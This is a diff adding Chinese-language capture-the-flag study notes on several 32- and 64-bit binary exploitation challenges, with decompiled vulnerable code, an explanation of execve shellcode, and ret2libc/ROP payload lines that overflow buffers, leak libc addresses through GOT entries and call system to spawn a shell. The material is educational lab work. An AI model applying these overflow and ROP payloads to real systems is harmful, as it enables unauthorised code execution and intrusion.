@@ -1,3 +1,192 @@
+## others_shellcode
+
+```c
+int getShell()
+{
+  int result; // eax
+  char v1[9]; // [esp-Ch] [ebp-Ch] BYREF
+
+  strcpy(v1, "/bin//sh");
+  result = 11;
+  __asm { int     80h; LINUX - sys_execve }
+  return result;
+}
+```
+
+本题没有payload，直接`io.interactive()`即可了。显然`getShell()`进行了我看不懂但我大受震撼的调用，所以有必要详细记录一下
+
+### `execve()`函数
+
+头文件：`#include <unistd.h>`
+
+函数声明：`int execve(const char *filename, char *const argv[], char *const envp[]);`
+
+函数说明：
+- 参数1：可执行的文件路径；
+- 参数2：C风格字符串的数组，代表执行时的参数，第一个元素必须为文件名，数组内以NULL结束；
+- 参数3：可以为NULL，传递给执行文件的新环境变量数组，数组内以NULL结束；
+
+函数行为（x86）：
+- eax存放execve的系统调用号11
+- ebx，ecx，edx依次存放参数1，2，3；
+- 执行int 0x80，即系统中断
+
+`#include <unistd.h>`这个头文件是类Unix才有的，所以这个函数不是C标准的；在类Unix系统上，C标准提供了`system()`函数，实际上是对`execve()`函数的封装：`system('/bin/sh')  ==>  execve("/bin/sh", {"sh", NULL}, NULL)  ==>  执行系统中断，调用号11`
+
+### 分析
+
+本题直接F5看上去会很懵，还是要看看汇编
+
+```x86asm
+public getShell
+getShell proc near
+; __unwind {
+push    ebp
+mov     ebp, esp
+call    __x86_get_pc_thunk_ax
+add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)
+xor     edx, edx        ; envp
+push    edx
+push    68732F2Fh
+push    6E69622Fh
+mov     ebx, esp        ; file
+push    edx
+push    ebx
+mov     ecx, esp        ; argv
+mov     eax, 0FFFFFFFFh
+sub     eax, 0FFFFFFF4h
+int     80h             ; LINUX - sys_execve
+nop
+pop     ebp
+retn
+; } // starts at 550
+```
+
+化简一下，应该一目了然了
+
+```c
+int getShell()
+{
+  int result;                   // eax
+  char v1[9];                   // [esp-Ch] [ebp-Ch] BYREF
+
+  strcpy(v1, "/bin//sh");
+
+  mov ebx, esp                  // file = v1
+  push ebx; mov ecx, esp        // argv = file
+  xor edx, edx                  // envp = NULL
+  result = 11;                  // mov eax, 11
+
+  __asm { int     80h; LINUX - sys_execve }
+  return result;
+}
+```
+
+## ciscn_2019_ne_5
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  //...
+  char src[4]; // [esp+4h] [ebp-FCh] BYREF
+  //...
+  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
+  //...
+  __isoc99_scanf("%100s", s1);
+  if ( strcmp(s1, "administrator") )
+  {
+    puts("Password Error!");
+    exit(0);
+  }
+  //...
+  switch ( v4 )
+  {
+    case 1:
+      AddLog(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    //...
+    case 3:
+      Print();
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 4:
+      GetFlag(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+  }
+  return result;
+}
+
+int __cdecl AddLog(int a1)
+{
+  printf("Please input new log info:");
+  return __isoc99_scanf("%128s", a1);
+}
+
+int Print()
+{
+  return system("echo Printing......");
+}
+
+int __cdecl GetFlag(char *src)
+{
+  char dest[4]; // [esp+0h] [ebp-48h] BYREF
+  char v3[60]; // [esp+4h] [ebp-44h] BYREF
+
+  *(_DWORD *)dest = 48;
+  memset(v3, 0, sizeof(v3));
+  strcpy(dest, src);
+  return printf("The flag is your log:%s\n", dest);
+}
+```
+
+`main()`函数里的字符串几乎都能溢出；但是能用的只有`src`一个，并且对它的输入在`AddLog()`函数里；并且由于`main()`是个死循环，而`AddLog()`本身没有可以利用的地方，就只能在`GetFlag()`里通过`strcpy()`利用了。
+
+函数窗口中可见`system()`（0x80484d0），但是没有`"/bin/sh"`；本题有多种做法的，先看一下标准做法
+
+### 标准做法
+
+String view中有`LOAD:080482E6	00000007	C	fflush`，这是一个字符串，并且它的字串中有`"sh"`（0x80482e6+4），
+
+那么就是简单的32位rop了，`payload = b'a'*0x(48+4) + p32(0x80484d0) + p32(0x80482ea)`
+
+### 我的初始做法
+
+既然往事俱备，只欠`"/bin/sh"`，而`"/bin/sh"`又是一个字符串，那应该可以通过标准输入的方式。但是缺点是这种方式需要获取字符串缓冲区的指针来作为`system()`的参数，在没有`printf()`漏洞的情况下、以我目前的能力做不到这一点；但是既然是作为参数，那如果这个指针是另一个函数的参数呢？在32位rop中，参数是不会被弹掉的，而`GetFlag(char *src)`恰好有一个满足条件的参数。
+
+但仅仅有参数还不够，32位rop中也比正常调用少了一步`push eip`（`call fun := push eip; jmp fun`，`ret := pop edx; jmp edx`），这会导致`GetFlag(char *src)`的参数被当成`system()`函数的返回地址；恰好在`Print()`中有`call _system`指令，这就满足条件了。
+
+但最终这个方法没有打通。原因在于`gets()`函数，这个函数会给输入的字符串补上NULL，导致指针参数的值不可避免地被修改了。
+
+## 铁人三项(第五赛区)_2018_rop
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+10h] [ebp-88h] BYREF
+
+  return read(0, buf, 0x100u);
+}
+```
+
+简单32位rop，没有`system("/bin/sh")`，需要泄露libc
+
+```python
+payload_a = b'a'*0x8c + p32(elf.plt['write']) + p32(elf.symbols['vulnerable_function']) + p32(1) + p32(elf.got['write']) + p32(4)
+payload_b = b'a'*0x8c + p32(system) + p32(0) + p32(bin_sh)
+```
+
+## bjdctf_2020_babyrop
+
+[铁人三项(第五赛区)_2018_rop](#铁人三项(第五赛区)_2018_rop)的64位版
+
+```python
+pop_rdi_ret = next(elf.search(asm('pop rdi\nret')))
+payload_a = b'a'*0x28 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['vuln'])
+payload_b = b'a'*0x28 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+```
+
 ## bjdctf_2020_babystack
 
 ```c
